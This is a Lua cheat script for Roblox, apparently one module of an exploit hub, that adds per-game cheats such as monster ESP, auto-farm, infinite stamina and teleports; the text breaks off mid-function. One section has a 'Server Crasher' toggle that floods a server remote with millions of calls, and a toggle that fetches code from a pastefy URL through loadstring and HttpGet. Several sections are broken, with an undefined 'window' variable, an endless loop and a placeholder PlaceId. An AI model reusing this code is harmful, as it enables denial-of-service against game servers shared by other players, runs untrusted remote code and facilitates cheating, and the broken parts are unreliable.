
local Window = getgenv().RayfieldWindow
local Rayfield = getgenv().RayfieldLib

if not Window then
    warn("RayfieldWindow not found! Make sure to run the loader first.")
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- =========================================================
-- LIGHTS OUT
-- =========================================================

if game.PlaceId == 101421882323748 then
    _G.NotGames2 = false

    local mTab = Window:CreateTab("main", "compass")

    local level0 = workspace:WaitForChild("Level0")
    local facelings = level0:WaitForChild("Facelings")

    local espEnabled = false
    local espConnection = nil
    local modelConnections = {}

    local function removeESP(model)
        local connections = modelConnections[model]

        if connections then
            for _, connection in ipairs(connections) do
                if connection.Connected then
                    connection:Disconnect()
                end
            end

            modelConnections[model] = nil
        end

        if model and model.Parent then
            local highlight = model:FindFirstChild("esp")
            local billboard = model:FindFirstChild("state")

            if highlight then
                highlight:Destroy()
            end

            if billboard then
                billboard:Destroy()
            end
        end
    end

    local function clearESP()
        for model in pairs(modelConnections) do
            removeESP(model)
        end

        for _, model in ipairs(facelings:GetChildren()) do
            if model:IsA("Model") then
                removeESP(model)
            end
        end
    end

    local function applyESP(model)
        if not espEnabled then
            return
        end

        if not model:IsA("Model") or not model.Parent then
            return
        end

        if model:FindFirstChild("esp") then
            return
        end

        local adornee = model:FindFirstChild("HumanoidRootPart")
            or model:FindFirstChild("Head")
            or model.PrimaryPart
            or model:FindFirstChildWhichIsA("BasePart")

        local highlight = Instance.new("Highlight")
        highlight.Name = "esp"
        highlight.Adornee = model
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Parent = model

        local connections = {}
        modelConnections[model] = connections

        if adornee then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "state"
            billboard.Adornee = adornee
            billboard.Size = UDim2.fromOffset(120, 40)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = model

            local label = Instance.new("TextLabel")
            label.Size = UDim2.fromScale(1, 1)
            label.BackgroundTransparency = 1
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.TextStrokeTransparency = 0.5
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.Parent = billboard

            local function updateText()
                if not model.Parent or not label.Parent then
                    return
                end

                local state = model:GetAttribute("State")
                label.Text = state ~= nil and tostring(state) or "Unknown"
            end

            updateText()

            table.insert(
                connections,
                model:GetAttributeChangedSignal("State"):Connect(updateText)
            )
        end

        table.insert(
            connections,
            model.AncestryChanged:Connect(function(_, parent)
                if not parent then
                    removeESP(model)
                end
            end)
        )
    end

    local function startESP()
        clearESP()

        for _, model in ipairs(facelings:GetChildren()) do
            applyESP(model)
        end

        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end

        espConnection = facelings.ChildAdded:Connect(function(model)
            task.defer(function()
                if espEnabled and model.Parent == facelings then
                    applyESP(model)
                end
            end)
        end)
    end

    local function stopESP()
        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end

        clearESP()
    end

    mTab:CreateToggle({
        Name = "Monster ESP (Toggle)",
        CurrentValue = false,

        Callback = function(value)
            espEnabled = value

            if value then
                startESP()
                print("[ESP] Monster ESP Enabled")
            else
                stopESP()
                print("[ESP] Monster ESP Disabled")
            end
        end
    })
end

-- =========================================================
-- STEAL OR DIE
-- =========================================================

if game.PlaceId == 119925538689885 then
    _G.NotGames2 = false

    local mTab = Window:CreateTab("main", "compass")

    local monsterESPEnabled = false
    local connections = {}
    local characterConnections = {}

    local function disconnectConnections(connectionList)
        for _, connection in ipairs(connectionList) do
            if connection.Connected then
                connection:Disconnect()
            end
        end

        table.clear(connectionList)
    end

    local function applyMonsterESP(character)
        if not monsterESPEnabled then
            return
        end

        if not character or not character.Parent then
            return
        end

        if not character:GetAttribute("EntityKind") then
            return
        end

        if character:FindFirstChild("MonsterESP") then
            return
        end

        local highlight = Instance.new("Highlight")
        highlight.Name = "MonsterESP"
        highlight.Adornee = character
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0.5
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Enabled = true
        highlight.Parent = character
    end

    local function watchCharacter(character)
        if not monsterESPEnabled or not character then
            return
        end

        applyMonsterESP(character)

        if character:GetAttribute("EntityKind") then
            return
        end

        local connection

        connection = character:GetAttributeChangedSignal("EntityKind"):Connect(function()
            if not monsterESPEnabled then
                connection:Disconnect()
                return
            end

            if character:GetAttribute("EntityKind") then
                applyMonsterESP(character)
                connection:Disconnect()
            end
        end)

        table.insert(characterConnections, connection)
    end

    local function watchPlayer(player)
        if player.Character then
            watchCharacter(player.Character)
        end

        table.insert(
            connections,
            player.CharacterAdded:Connect(function(character)
                watchCharacter(character)
            end)
        )
    end

    local function clearMonsterESP()
        for _, player in ipairs(Players:GetPlayers()) do
            local character = player.Character

            if character then
                local highlight = character:FindFirstChild("MonsterESP")

                if highlight then
                    highlight:Destroy()
                end
            end
        end
    end

    local function startMonsterESP()
        disconnectConnections(connections)
        disconnectConnections(characterConnections)

        for _, player in ipairs(Players:GetPlayers()) do
            watchPlayer(player)
        end

        table.insert(
            connections,
            Players.PlayerAdded:Connect(function(player)
                watchPlayer(player)
            end)
        )
    end

    local function stopMonsterESP()
        disconnectConnections(connections)
        disconnectConnections(characterConnections)

        clearMonsterESP()
    end

    mTab:CreateToggle({
        Name = "Monster ESP (Toggle)",
        CurrentValue = false,

        Callback = function(value)
            monsterESPEnabled = value

            if value then
                startMonsterESP()
                print("[ESP] Monster ESP Enabled")
            else
                stopMonsterESP()
                print("[ESP] Monster ESP Disabled")
            end
        end
    })
end

-- =========================================================
-- STRAFEX
-- =========================================================

if game.PlaceId == 129861507977954 then
    _G.NotGames2 = false

    local player = Players.LocalPlayer

    local function detectOffhand(item)
        return player:GetAttribute("Offhand") == item
    end

    local hasTotem = detectOffhand("Totem")

    if hasTotem then
        print("[Strafex] Totem detected in offhand")
    else
        print("[Strafex] No Totem in offhand")
    end
end







-- =========================================================
-- DING DONG DITCH
-- HOTEL + NEIGHBORHOOD
-- =========================================================

if game.PlaceId == 92551591080135 then
    _G.NotGames2 = false

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local player = Players.LocalPlayer
    local map = workspace:WaitForChild("Map")

    print("[Ding Dong Ditch] Starting...")

    -- =====================================================
    -- PREVIOUS INSTANCE CLEANUP
    -- =====================================================

    if shared.DingDongDitchState then
        local oldState = shared.DingDongDitchState
        oldState.running = false

        for _, name in ipairs({
            "safeSpotHotel",
            "safeSpotNeighborhood"
        }) do
            local part = oldState[name]

            if part then
                pcall(function()
                    part:Destroy()
                end)
            end
        end
    end

    local runState = {
        running = true,
        safeSpotHotel = nil,
        safeSpotNeighborhood = nil
    }

    shared.DingDongDitchState = runState

    -- =====================================================
    -- HOTEL REFERENCES
    -- =====================================================

    local hotelHouses
    local hotelExitOpen
    local escapeHotel

    local function setupHotel()
        local success, result = pcall(function()
            hotelHouses = map:FindFirstChild("Houses")

            local matchInfo = ReplicatedStorage:FindFirstChild("MatchInfo")
            hotelExitOpen = matchInfo and matchInfo:FindFirstChild("ExitOpen")

            local environment = map:FindFirstChild("Environment")
            local stairs = environment and environment:FindFirstChild("NorthStairs")

            escapeHotel = stairs and stairs:FindFirstChild("StreetDoor")

            if not hotelHouses then
                error("Hotel Houses folder not found")
            end

            if not hotelExitOpen then
                error("Hotel MatchInfo.ExitOpen not found")
            end

            if not escapeHotel then
                error("Hotel StreetDoor not found")
            end

            return true
        end)

        if not success then
            warn("[Ding Dong Ditch] Hotel skipped: " .. tostring(result))
            return false
        end

        print("[Ding Dong Ditch] Hotel references loaded")
        return true
    end

    local hotelFound = setupHotel()

    -- =====================================================
    -- NEIGHBORHOOD REFERENCES
    -- =====================================================

    local neighborhoodHouses = map:FindFirstChild("Houses")

    local escapeFolder = map:FindFirstChild("Escape")
    local escapeNeighborhood = escapeFolder
        and escapeFolder:FindFirstChild("EscapeZone")

    if escapeNeighborhood then
        print("[Ding Dong Ditch] Neighborhood exit found")
    else
        warn("[Ding Dong Ditch] Neighborhood EscapeZone not found")
    end

    if neighborhoodHouses then
        print("[Ding Dong Ditch] Neighborhood Houses folder found")
    else
        warn("[Ding Dong Ditch] Neighborhood Houses folder not found")
    end

    -- =====================================================
    -- SETTINGS
    -- =====================================================

    local hotelSettings = {
        autoFarm = false,
        getKnocked = false,
        autoEscape = true,
        partyRoomPriority = false,
        transparency = 0
    }

    local neighborhoodSettings = {
        autoFarm = false,
        autoEscape = true,
        partyRoomPriority = false,
        transparency = 0
    }

    -- =====================================================
    -- SAFE SPOT CREATION
    -- =====================================================

    local function createSafeSpot(name)
        local part = Instance.new("Part")

        part.Name = name
        part.Size = Vector3.new(1000, 1, 1000)
        part.Anchored = true
        part.CanCollide = true
        part.Transparency = 0
        part.CFrame = CFrame.new(0, 200, 0)
        part.Parent = workspace

        return part
    end

    local safeSpotHotel
    local safeSpotNeighborhood

    if hotelFound then
        local success, result = pcall(function()
            safeSpotHotel = createSafeSpot("safeHotel")
            runState.safeSpotHotel = safeSpotHotel
        end)

        if not success then
            warn("[Ding Dong Ditch] Hotel safe spot error: " .. tostring(result))
        end
    end

    local neighborhoodSafeSuccess, neighborhoodSafeError = pcall(function()
        safeSpotNeighborhood = createSafeSpot("safeNeighborhood")
        runState.safeSpotNeighborhood = safeSpotNeighborhood
    end)

    if not neighborhoodSafeSuccess then
        warn("[Ding Dong Ditch] Neighborhood safe spot error: " .. tostring(neighborhoodSafeError))
    end

    -- =====================================================
    -- TRANSPARENCY
    -- =====================================================

    local function updateHotelTransparency()
        if safeSpotHotel and safeSpotHotel.Parent then
            safeSpotHotel.Transparency = hotelSettings.transparency
        end
    end

    local function updateNeighborhoodTransparency()
        if safeSpotNeighborhood and safeSpotNeighborhood.Parent then
            safeSpotNeighborhood.Transparency = neighborhoodSettings.transparency
        end
    end

    -- =====================================================
    -- HOTEL UI
    -- =====================================================

    if hotelFound then
        local success, result = pcall(function()
            local HotelTab = Window:CreateTab("Hotel", "compass")

            HotelTab:CreateToggle({
                Name = "Auto Farm",
                CurrentValue = false,
                Flag = "HotelAutoFarm",

                Callback = function(value)
                    hotelSettings.autoFarm = value
                end
            })

            HotelTab:CreateToggle({
                Name = "Get already Knocked",
                CurrentValue = false,
                Flag = "HotelGetKnocked",

                Callback = function(value)
                    hotelSettings.getKnocked = value
                end
            })

            HotelTab:CreateToggle({
                Name = "Auto Escape",
                CurrentValue = true,
                Flag = "HotelAutoEscape",

                Callback = function(value)
                    hotelSettings.autoEscape = value
                end
            })

            HotelTab:CreateToggle({
                Name = "Party Room Priority",
                CurrentValue = false,
                Flag = "HotelPartyRoomPriority",

                Callback = function(value)
                    hotelSettings.partyRoomPriority = value
                end
            })

            HotelTab:CreateSlider({
                Name = "Safe Spot Transparency",
                Range = {0, 1},
                Increment = 0.1,
                Suffix = "",
                CurrentValue = 0,
                Flag = "HotelSafeSpotTransparency",

                Callback = function(value)
                    hotelSettings.transparency = value
                    updateHotelTransparency()
                end
            })
        end)

        if not success then
            warn("[Ding Dong Ditch] Hotel UI error: " .. tostring(result))
        else
            print("[Ding Dong Ditch] Hotel UI loaded")
        end
    else
        print("[Ding Dong Ditch] Skipping Hotel and continuing...")
    end

    -- =====================================================
    -- NEIGHBORHOOD UI
    -- =====================================================

    do
        local success, result = pcall(function()
            local NeighborhoodTab = Window:CreateTab("Neighborhood", "compass")

            NeighborhoodTab:CreateToggle({
                Name = "Auto Farm",
                CurrentValue = false,
                Flag = "NeighborhoodAutoFarm",

                Callback = function(value)
                    neighborhoodSettings.autoFarm = value
                end
            })

            NeighborhoodTab:CreateToggle({
                Name = "Auto Escape",
                CurrentValue = true,
                Flag = "NeighborhoodAutoEscape",

                Callback = function(value)
                    neighborhoodSettings.autoEscape = value
                end
            })

            NeighborhoodTab:CreateToggle({
                Name = "Party Room Priority",
                CurrentValue = false,
                Flag = "NeighborhoodPartyRoomPriority",

                Callback = function(value)
                    neighborhoodSettings.partyRoomPriority = value
                end
            })

            NeighborhoodTab:CreateSlider({
                Name = "Safe Spot Transparency",
                Range = {0, 1},
                Increment = 0.1,
                Suffix = "",
                CurrentValue = 0,
                Flag = "NeighborhoodSafeSpotTransparency",

                Callback = function(value)
                    neighborhoodSettings.transparency = value
                    updateNeighborhoodTransparency()
                end
            })
        end)

        if not success then
            warn("[Ding Dong Ditch] Neighborhood UI error: " .. tostring(result))
        else
            print("[Ding Dong Ditch] Neighborhood UI loaded")
        end
    end

    -- =====================================================
    -- HOTEL PROMPT FINDER
    -- =====================================================

    local function getHotelPrompts()
        if not hotelFound or not hotelHouses then
            return {}
        end

        local partyPrompts = {}
        local normalPrompts = {}

        for _, prompt in ipairs(hotelHouses:GetDescendants()) do
            if prompt:IsA("ProximityPrompt")
                and prompt.Name == "KnockPrompt" then

                local knocked = prompt:GetAttribute("Knocked") == true
                local party = prompt:GetAttribute("Party") == true

                if not hotelSettings.getKnocked or knocked then
                    if hotelSettings.partyRoomPriority and party then
                        table.insert(partyPrompts, prompt)
                    else
                        table.insert(normalPrompts, prompt)
                    end
                end
            end
        end

        local results = {}

        for _, prompt in ipairs(partyPrompts) do
            table.insert(results, prompt)
        end

        for _, prompt in ipairs(normalPrompts) do
            table.insert(results, prompt)
        end

        return results
    end

    -- =====================================================
    -- NEIGHBORHOOD PROMPT FINDER
    -- SEARCHES HOUSE103, HOUSE104, ETC.
    -- ALWAYS SKIPS ALREADY-KNOCKED
    -- =====================================================

    local function getNeighborhoodPrompts()
        if not neighborhoodHouses then
            return {}
        end

        local partyPrompts = {}
        local normalPrompts = {}

        for _, house in ipairs(neighborhoodHouses:GetChildren()) do
            if house.Name:match("^House%d+$") then

                for _, prompt in ipairs(house:GetDescendants()) do
                    if prompt:IsA("ProximityPrompt")
                        and prompt.Name == "KnockPrompt" then

                        local knocked = prompt:GetAttribute("Knocked") == true
                        local party = prompt:GetAttribute("Party") == true

                        if not knocked then
                            if neighborhoodSettings.partyRoomPriority and party then
                                table.insert(partyPrompts, prompt)
                            else
                                table.insert(normalPrompts, prompt)
                            end
                        end
                    end
                end
            end
        end

        local results = {}

        for _, prompt in ipairs(partyPrompts) do
            table.insert(results, prompt)
        end

        for _, prompt in ipairs(normalPrompts) do
            table.insert(results, prompt)
        end

        return results
    end

    -- =====================================================
    -- CONTINUOUS TRANSPARENCY SYNC
    -- =====================================================

    task.spawn(function()
        while runState.running do
            updateHotelTransparency()
            updateNeighborhoodTransparency()

            task.wait(0.2)
        end
    end)

    -- =====================================================
    -- CLEANUP
    -- =====================================================

    task.spawn(function()
        while runState.running do
            task.wait(1)
        end

        if safeSpotHotel and safeSpotHotel.Parent then
            safeSpotHotel:Destroy()
        end

        if safeSpotNeighborhood and safeSpotNeighborhood.Parent then
            safeSpotNeighborhood:Destroy()
        end
    end)

    -- =====================================================
    -- FINISHED
    -- =====================================================

    print("[Ding Dong Ditch] Loading finished")
    print("[Ding Dong Ditch] Hotel found: " .. tostring(hotelFound))
    print("[Ding Dong Ditch] Neighborhood exit found: " .. tostring(escapeNeighborhood ~= nil))
end


if game.PlaceId == 136169205786617 then
    _G.NotGames2 = false
     local MTab = Window:CreateTab("main", "compass")
     MTab:CreateToggle({
        Name = "Server Crasher",
        CurrentValue = false,
        Flag = "scrashcer",

        Callback = function(value)
            game:GetService('NetworkClient'):SetOutgoingKBPSLimit(0) 
            local gc = game:GetService('ReplicatedStorage').VisualRemotes.GetChunk
            for _, c in getconnections(gc.OnClientEvent) do 
                pcall(function() c:Disable() end) 
                pcall(function() c:Disconnect() end) 
            end
            print('Started')
            for x = 0.001, 1, 0.001 do   
                for y = 0.00001, 1, 0.00001 do  
                    gc:FireServer(x, y)
                end
                task.wait()
            end
            print('End')
        end
    })

        MTab:CreateToggle({
        Name = "chest kick vulnerability",
        CurrentValue = false,
        Flag = "scrashcer",

        Callback = function(value)
            loadstring(game:HttpGet("https://pastefy.app/P840bAfT/raw"))
        end
    })

end

--fake sick
if game.PlaceId == 87746839382510 then
    _G.NotGames2 = false
    local Tab = Window:CreateTab("ESP", 4483362458)

    local fs = workspace:WaitForChild("FS")

    local function createEsp(personName)
        local person = fs:FindFirstChild(personName)
        if not person then return end

        if person:FindFirstChild("ESP") then return end

        local esp = Instance.new("Highlight")
        esp.Name = "ESP"
        esp.FillColor = Color3.fromRGB(255, 0, 0)
        esp.OutlineColor = Color3.fromRGB(255, 255, 255)
        esp.FillTransparency = 0.5
        esp.OutlineTransparency = 0
        esp.Parent = person
    end

    local function removeEsp(personName)
        local person = fs:FindFirstChild(personName)
        if not person then return end

        local esp = person:FindFirstChild("ESP")
        if esp then
            esp:Destroy()
        end
    end

    local function createToggle(personName)
        Tab:CreateToggle({
            Name = personName .. " ESP",
            CurrentValue = false,
            Flag = personName .. "ESP",
            Callback = function(Value)
                if Value then
                    createEsp(personName)
                else
                    removeEsp(personName)
                end
            end
        })
    end

    createToggle("Dad")
    createToggle("Mom")
    createToggle("Sis")

end

--creature crawler thing
if game.PlaceId == 95651261712519 then
        _G.NotGames2 = false
        local Tab = Window:CreateTab("main", 4483362458)
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")

        local plr = Players.LocalPlayer
        local connection

        Tab:CreateToggle({
            Name = "Infinite Stamina",
            CurrentValue = false,
            Callback = function(Value)
                if Value then
                    connection = RunService.Heartbeat:Connect(function()
                        plr:SetAttribute("Stamina", 100)
                    end)
                else
                    if connection then
                        connection:Disconnect()
                        connection = nil
                    end
                end
            end
        })

end

-- Into the hive
if game.PlaceId == 127112779460977 then
        _G.NotGames2 = false
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        local player = Players.LocalPlayer

        -- Gen 1 syntax: CreateTab(name, icon)
        local GTab = window:CreateTab("Gameplay", 93364949241311)

        local ESPEnabled = false
        local AutoMineEnabled = false
        local FOLDER_NAME = "HighlightFolder" -- Change this to the target folder name in Workspace

        local activeHighlights = {}
        local childAddedConn

        local function clearHighlights()
            if childAddedConn then
                childAddedConn:Disconnect()
                childAddedConn = nil
            end

            for _, highlight in ipairs(activeHighlights) do
                if highlight then
                    highlight:Destroy()
                end
            end
            table.clear(activeHighlights)
        end

        local function addHighlight(target)
            if not ESPEnabled then
                return
            end
            if not target:IsA("BasePart") and not target:IsA("Model") then
                return
            end
            if target:FindFirstChildOfClass("Highlight") then
                return
            end

            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(255, 255, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.Adornee = target
            highlight.Parent = target

            table.insert(activeHighlights, highlight)
        end

        -- Bug ESP Toggle
        GTab:CreateToggle({
            Name = "Bug ESP",
            CurrentValue = false,
            Flag = "BugESP_INTOTHEHIVE",
            Callback = function(Value)
                ESPEnabled = Value

                if Value then
                    local folder = workspace:FindFirstChild(FOLDER_NAME)
                    if not folder then
                        return
                    end

                    for _, child in ipairs(folder:GetChildren()) do
                        addHighlight(child)
                    end

                    childAddedConn = folder.ChildAdded:Connect(addHighlight)
                else
                    clearHighlights()
                end
            end,
        })


    --might have more stuff  on priv hub but feel free to add more stuff here if you want by forking the repo and making a pull request
end


--feed a mei mei
if game.PlaceId == 127655305190243 then
        _G.NotGames2 = false
        local Tab = window:CreateTab("main", 93364949241311)

        local RunService = game:GetService("RunService")

        local click = workspace.MeiMeiStuff.MeiMei.Body.PetClick
        local connection

        Tab:CreateToggle({
            Name = "Auto Pet Click",
            CurrentValue = false,
            Flag = "AutoPetClick",
            Callback = function(Value)
                if Value then
                    connection = RunService.RenderStepped:Connect(function()
                        fireclickdetector(click)
                    end)
                else
                    if connection then
                        connection:Disconnect()
                        connection = nil
                    end
                end
            end
        })

        local packages = workspace.MeiMeiStuff.Packages
    local connection
    local enabled = false

    Tab:CreateToggle({
        Name = "Auto Package Click",
        CurrentValue = false,
        Flag = "AutoPackageClick",

        Callback = function(Value)
            enabled = Value

            if Value then
                for _, v in ipairs(packages:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end

                connection = packages.DescendantAdded:Connect(function(v)
                    if enabled and v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end)
            else
                if connection then
                    connection:Disconnect()
                    connection = nil
                end
            end
        end
    })


    local packages = workspace.MeiMeiStuff.Poops

    local enabled = false
    local active = {}
    local connection

    Tab:CreateToggle({
        Name = "Auto Poop Collect",
        CurrentValue = false,
        Flag = "AutoPoopCollect",

        Callback = function(Value)
            enabled = Value

            if Value then
                local function clickBox(v)
                    if not enabled or not v:IsA("ClickDetector") or active[v] then
                        return
                    end

                    active[v] = true

                    task.spawn(function()
                        while enabled and v.Parent and v:IsDescendantOf(packages) do
                            fireclickdetector(v)
                            task.wait(0.1)
                        end

                        active[v] = nil
                    end)
                end

                for _, v in ipairs(packages:GetDescendants()) do
                    clickBox(v)
                end

                connection = packages.DescendantAdded:Connect(function(v)
                    clickBox(v)
                end)
            else
                if connection then
                    connection:Disconnect()
                    connection = nil
                end

                table.clear(active)
            end
        end
    })

    local bowl = workspace.MeiMeiStuff.FoodArea.FoodBowl

    local enabled = false
    local running = false

    local function getBowl()
        for _, v in ipairs(bowl:GetChildren()) do
            if v:IsA("ClickDetector") then
                return v
            end
        end
    end

    Tab:CreateToggle({
        Name = "Auto Feed",
        CurrentValue = false,
        Flag = "AutoFeed",

        Callback = function(Value)
            enabled = Value

            if Value and not running then
                running = true

                task.spawn(function()
                    while enabled do
                        local click = getBowl()

                        if click then
                            fireclickdetector(click)
                        end

                        task.wait(0.1)
                    end

                    running = false
                end)
            end
        end
    })
end

--stay alive
if game.PlaceId == 73274756083320 then
    _G.NotGames2 = false
    local Tab = window:CreateTab("main", 93364949241311)
    local monsters = workspace:WaitForChild("Monster")

    local ESPEnabled = false
    local childAddedConn
    local activeHighlights = {}

    local function createEsp(v)
        if not ESPEnabled then return end
        if activeHighlights[v] then return end
        if v:FindFirstChild("esp") then return end

        local esp = Instance.new("Highlight")
        esp.Name = "esp"
        esp.FillColor = Color3.fromRGB(255, 0, 0)
        esp.OutlineColor = Color3.fromRGB(255, 255, 255)
        esp.Parent = v

        activeHighlights[v] = esp
    end

    local function clearEsp()
        if childAddedConn then
            childAddedConn:Disconnect()
            childAddedConn = nil
        end

        for v, esp in pairs(activeHighlights) do
            if esp then
                esp:Destroy()
            end
            activeHighlights[v] = nil
        end
    end

    Tab:CreateToggle({
        Name = "Monster ESP",
        CurrentValue = false,
        Flag = "MonsterESP",

        Callback = function(Value)
            ESPEnabled = Value

            if Value then
                for _, v in ipairs(monsters:GetChildren()) do
                    createEsp(v)
                end

                childAddedConn = monsters.ChildAdded:Connect(function(v)
                    createEsp(v)
                end)
            else
                clearEsp()
            end
        end
    })

end

--siren head: the forest
if game.PlaceId == 7881326119 then
    _G.NotGames2 = false
     local Tab = window:CreateTab("main", 93364949241311)
    local CC = workspace:WaitForChild("Cartoon Cat")
    local SH = workspace:WaitForChild("Siren Head")
    local LH = workspace:WaitForChild("Long Horse")

    local function createEsp(v)
        if v:FindFirstChild("esp") then return end

        local esp = Instance.new("Highlight")
        esp.Name = "esp"
        esp.FillColor = Color3.fromRGB(255, 0, 0)
        esp.OutlineColor = Color3.fromRGB(255, 255, 255)
        esp.Parent = v

        return esp
    end

    local function removeEsp(v)
        local esp = v:FindFirstChild("esp")
        if esp then
            esp:Destroy()
        end
    end

    Tab:CreateToggle({
        Name = "Cartoon Cat ESP",
        CurrentValue = false,
        Flag = "CartoonCatESP",

        Callback = function(Value)
            if Value then
                createEsp(CC)
            else
                removeEsp(CC)
            end
        end
    })

    Tab:CreateToggle({
        Name = "Siren Head ESP",
        CurrentValue = false,
        Flag = "SirenHeadESP",

        Callback = function(Value)
            if Value then
                createEsp(SH)
            else
                removeEsp(SH)
            end
        end
    })

    Tab:CreateToggle({
        Name = "Long Horse ESP",
        CurrentValue = false,
        Flag = "LongHorseESP",

        Callback = function(Value)
            if Value then
                createEsp(LH)
            else
                removeEsp(LH)
            end
        end
    })

    local scrap = {}
    local scrapHighlights = {}

    local function getScrap()
        table.clear(scrap)

        for _, v in ipairs(workspace.Game.Scrap:GetChildren()) do
            table.insert(scrap, v)
        end
    end

    local function createScrapEsp(v)
        if scrapHighlights[v] or v:FindFirstChild("esp") then
            return
        end

        local esp = Instance.new("Highlight")
        esp.Name = "esp"
        esp.FillColor = Color3.fromRGB(255, 255, 0)
        esp.OutlineColor = Color3.fromRGB(255, 255, 255)
        esp.Parent = v

        scrapHighlights[v] = esp
    end

    local function removeScrapEsp()
        for v, esp in pairs(scrapHighlights) do
            if esp then
                esp:Destroy()
            end

            scrapHighlights[v] = nil
        end
    end

    Tab:CreateToggle({
        Name = "Scrap ESP",
        CurrentValue = false,
        Flag = "ScrapESP",

        Callback = function(Value)
            if Value then
                getScrap()

                for _, v in ipairs(scrap) do
                    createScrapEsp(v)
                end
            else
                removeScrapEsp()
            end
        end
    })


end

--mouse
if game.PlaceId == 89440018933049 then
    _G.NotGames2 = false
     local Tab = window:CreateTab("main", 93364949241311)

local mickey = workspace:WaitForChild("MickeyVisual")

local function createEsp(v)
    if not v or v:FindFirstChild("esp") then
        return
    end

    local esp = Instance.new("Highlight")
    esp.Name = "esp"
    esp.FillColor = Color3.fromRGB(255, 0, 0)
    esp.OutlineColor = Color3.fromRGB(255, 255, 255)
    esp.Adornee = v
    esp.Parent = v

    return esp
end

local function removeEsp(v)
    if not v then return end

    local esp = v:FindFirstChild("esp")
    if esp then
        esp:Destroy()
    end
end

Tab:CreateToggle({
    Name = "Mickey ESP",
    CurrentValue = false,
    Flag = "MickeyESP",

    Callback = function(Value)
        if Value then
            createEsp(mickey)
        else
            removeEsp(mickey)
        end
    end
})

Tab:CreateButton({
    Name = "Go to safe spot",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")

        hrp.CFrame = CFrame.new(0, 71, 628)
    end,
})

Tab:CreateButton({
    Name = "Instant opens stuff",
    Callback = function()
        for _, v in ipairs(game:GetDescendants()) do
            if v:IsA("ProximityPrompt") then
                v.HoldDuration = 0
            end
        end
    end,
})

end

--locust dead air
if game.PlaceId == 107330821943384 then
        _G.NotGames2 = false
     local Tab = window:CreateTab("main", 93364949241311)

     local L = workspace.MONSTER

     local function createEsp(v)
    if not v or v:FindFirstChild("esp") then
        return
    end

    local esp = Instance.new("Highlight")
    esp.Name = "esp"
    esp.FillColor = Color3.fromRGB(255, 0, 0)
    esp.OutlineColor = Color3.fromRGB(255, 255, 255)
    esp.Adornee = v
    esp.Parent = v

    return esp
end

local function removeEsp(v)
    if not v then return end

    local esp = v:FindFirstChild("esp")
    if esp then
        esp:Destroy()
    end
end

Tab:CreateToggle({
    Name = "locust ESP",
    CurrentValue = false,
    Flag = "locustyESP",

    Callback = function(Value)
        if Value then
            createEsp(L)
        else
            removeEsp(L)
        end
    end
})
end

--house of guilt 
--ts game so bad its making me so bad
if game.PlaceId == 8 then --game name need real one
            _G.NotGames2 = false
     local Tab = window:CreateTab("main", 93364949241311)
    while task.wait(1) do
    local guilt = workspace.Guilt
    end
    local Tab = window:CreateTab("main", 93364949241311)

         local function createEsp(v)
            while task.wait() do
    if not v or v:FindFirstChild("esp") then
        return
    end

    local esp = Instance.new("Highlight")
    esp.Name = "esp"
    esp.FillColor = Color3.fromRGB(255, 0, 0)
    esp.OutlineColor = Color3.fromRGB(255, 255, 255)
    esp.Adornee = v
    esp.Parent = v

    return esp
end
end

local function removeEsp(v)
    if not v then return end

    local esp = v:FindFirstChild("esp")
    if esp then
        esp:Destroy()
    end
end

Tab:CreateToggle({
    Name = "locust ESP",
    CurrentValue = false,
    Flag = "locustyESP",

    Callback = function(Value)
        if Value then
            createEsp(guilt)
        else
            removeEsp(guilt)
        end
    end
})
end

--you vs hulk
if game.PlaceId == 101527854251487 then
            _G.NotGames2 = false
     local Tab = window:CreateTab("main", 93364949241311)
    local function getHulk()
        for _, v in ipairs(Players:GetPlayers()) do
            if v.Team and v.Team.Name == "Hulk" then
                return v.Character
            end
        end
    end

    local function removeHulkEsp()
        for _, v in ipairs(Players:GetPlayers()) do
            if v.Character then
                local esp = v.Character:FindFirstChild("esp")
                if esp then
                    esp:Destroy()
                end
            end
        end
    end

    Tab:CreateToggle({
        Name = "hulk ESP",
        CurrentValue = false,
        Flag = "hulkESP",

        Callback = function(Value)
            if Value then
                local hulk = getHulk()

                if hulk and not hulk:FindFirstChild("esp") then
                    local esp = Instance.new("Highlight")
                    esp.Name = "esp"
                    esp.FillColor = Color3.fromRGB(255, 0, 0)
                    esp.OutlineColor = Color3.fromRGB(255, 255, 255)
                    esp.Parent = hulk
                end
            else
                removeHulkEsp()
            end
        end
    })
end

-- survive an anomaly
if game.PlaceId == 112154382241395 then
                _G.NotGames2 = false
     local Tab = window:CreateTab("main", 93364949241311)

    Tab:CreateButton({
    Name = "Teleport to Platform",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")

        local part = Instance.new("Part")
        part.Name = "TeleportPlatform"
        part.Size = Vector3.new(9000, 1, 9000)
        part.CFrame = CFrame.new(0, 100, 0)
        part.Anchored = true
        part.Transparency = 1
        part.CanCollide = false
        part.CanTouch = false
